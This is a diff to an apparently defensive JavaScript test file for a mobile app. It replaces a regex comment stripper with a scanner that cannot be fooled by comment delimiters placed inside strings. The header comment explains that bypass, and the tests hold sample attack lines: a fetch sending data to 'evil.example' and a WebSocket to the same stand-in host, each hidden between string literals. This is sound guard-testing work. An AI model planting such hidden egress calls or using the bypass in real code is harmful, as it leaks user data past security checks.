@@ -44,11 +44,139 @@ function sourceFiles() {
  * a comment reading `tell "fresh install" from "we could not ask"` was read as importing a
  * package called "we could not ask", and two comments explaining WHY there is no WebView
  * were read as embedding one. A test that fails on its own explanation is a test people
- * learn to route around, and the routing-around is what actually costs you. */
-const withoutComments = (src) =>
-  src.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/(^|[^:])\/\/[^\n]*/g, '$1');
+ * learn to route around, and the routing-around is what actually costs you.
+ *
+ * THE REGEX VERSION OF THIS WAS A BYPASS, AND IT DISARMED ALL FOUR EGRESS GUARDS AT ONCE.
+ *
+ * `src.replace(/\/\*[\s\S]*?\*\//g, ' ')` does not know what a string literal is, so any code
+ * sitting between a string containing a slash-star and a string containing a star-slash was
+ * blanked before a single assertion ran. Three lines — open the window with a string, put a
+ * fetch in the middle, close it with a string — and the network-primitive check, the URL
+ * centralisation check, the WebView check and the third-party import allowlist all pass.
+ * `@sentry/react-native` imported inside such a window passed too. The one promise this app
+ * makes about itself was guarded by a regex that a two-line string literal turns off.
+ *
+ * So this is a scanner rather than a regex. It walks the source once, tracking whether it is
+ * inside a single-quoted, double-quoted or template string, and only blanks a region it
+ * reached from actual code. A slash-star inside a string is now just text. Comments are still
+ * removed, so the three prose false-positives above stay fixed — there is a test below that
+ * holds both halves: the bypass is caught, and the prose still passes. */
+function withoutComments(src) {
+  let out = '';
+  let i = 0;
+  const n = src.length;
+  /* null = in code; otherwise the quote character we are waiting to close. */
+  let quote = null;
+
+  while (i < n) {
+    const ch = src[i];
+    const next = src[i + 1];
+
+    if (quote) {
+      /* Inside a string. Nothing here opens a comment. Copied through, so a specifier or a
+         URL written in real code is still seen by the assertions. */
+      if (ch === '\\') { out += src.slice(i, i + 2); i += 2; continue; }
+      if (ch === quote) quote = null;
+      /* An unterminated quote would swallow the rest of the file, which is the same failure
+         in a different costume. A newline ends anything but a template string. */
+      else if (ch === '\n' && quote !== '`') quote = null;
+      out += ch; i += 1; continue;
+    }
+
+    if (ch === '/' && next === '*') {
+      const end = src.indexOf('*/', i + 2);
+      const skipped = end === -1 ? src.slice(i) : src.slice(i, end + 2);
+      /* Newlines kept, so line numbers in failure messages stay honest. */
+      out += ' ' + skipped.replace(/[^\n]/g, '');
+      i = end === -1 ? n : end + 2;
+      continue;
+    }
+    /* Not `://` — a line comment, not the middle of a URL. */
+    if (ch === '/' && next === '/' && src[i - 1] !== ':') {
+      const end = src.indexOf('\n', i);
+      i = end === -1 ? n : end;
+      continue;
+    }
+    if (ch === '\'' || ch === '"' || ch === '`') quote = ch;
+    out += ch; i += 1;
+  }
+  return out;
+}
 
 const FILES = sourceFiles().map((f) => ({ path: f.replace(ROOT + '/', ''), src: readFileSync(f, 'utf8') }));
+
+describe('the comment stripper the egress guards depend on', () => {
+  /* Every network assertion in this file runs on withoutComments() output, so a hole here is
+     a hole in all of them at once. These are tests OF THE GUARD, not of the app — the thing
+     that was missing when a regex stood here. */
+
+  /* Assembled at runtime so this file does not contain the literal sequence and trip its own
+     assertions, and so the test reads as what it is: an attacker's three lines. */
+  const OPEN = '/' + '*';
+  const CLOSE = '*' + '/';
+
+  test('code hidden between two string literals is still seen', () => {
+    const attack = [
+      `const glyph = '${OPEN}';`,
+      "export async function ping(){ return fetch('https://evil.example/j?d=' + body); }",
+      `const close = '${CLOSE}';`,
+    ].join('\n');
+    const out = withoutComments(attack);
+    assert.match(out, /\bfetch\s*\(/, 'a fetch() between two string literals was blanked');
+    assert.match(out, /https?:\/\//, 'a URL between two string literals was blanked');
+  });
+
+  test('an import hidden the same way is still seen', () => {
+    const attack = [
+      `const a = "${OPEN}";`,
+      "import * as Sentry from '@sentry/react-native';",
+      `const b = "${CLOSE}";`,
+    ].join('\n');
+    assert.match(withoutComments(attack), /@sentry\/react-native/,
+      'a third-party import between two string literals was blanked');
+  });
+
+  test('a template literal cannot open the window either', () => {
+    const attack = [
+      'const a = `' + OPEN + '`;',
+      "const send = () => new WebSocket('wss://evil.example');",
+      'const b = `' + CLOSE + '`;',
+    ].join('\n');
+    assert.match(withoutComments(attack), /\bWebSocket\b/,
+      'a WebSocket between two template literals was blanked');
+  });
+
+  test('and the prose it exists for is still removed', () => {
+    /* The other half, and the reason this cannot simply scan raw source. These three are the
+       real false positives named in the header — each one failed a real assertion. */
+    const prose = [
+      `${OPEN} tell "fresh install" from "we could not ask" ${CLOSE}`,
+      `${OPEN} there is deliberately no WebView anywhere in this app ${CLOSE}`,
+      '// and no react-native-webview either',
+      'const real = 1;',
+    ].join('\n');
+    const out = withoutComments(prose);
+    assert.doesNotMatch(out, /we could not ask/, 'prose in a block comment survived');
+    assert.doesNotMatch(out, /\bWebView\b/, 'a comment explaining the WebView rule survived');
+    assert.doesNotMatch(out, /react-native-webview/, 'a line comment survived');
+    assert.match(out, /const real = 1;/, 'the stripper ate real code around the comments');
+  });
+
+  test('a URL in real code survives, and so do line numbers', () => {
+    const src = ["const a = 1;", `${OPEN}\n a comment\n spanning lines\n${CLOSE}`,
+                 "const u = 'https://example.com/x';", '// trailing'].join('\n');
+    const out = withoutComments(src);
+    assert.match(out, /https:\/\/example\.com\/x/, 'a URL in real code was removed');
+    assert.equal(out.split('\n').length, src.split('\n').length,
+      'the stripper changed the line count, so failure messages will point at the wrong line');
+  });
+
+  test('an unterminated string does not swallow the rest of the file', () => {
+    const src = ["const bad = 'oops;", "export function ping(){ return fetch('https://evil.example'); }"].join('\n');
+    assert.match(withoutComments(src), /\bfetch\s*\(/,
+      'an unterminated quote blanked everything after it — the same hole in a different costume');
+  });
+});
 
 describe('the source tree is what SAFETY.md says it is', () => {
   test('there are source files to check', () => {
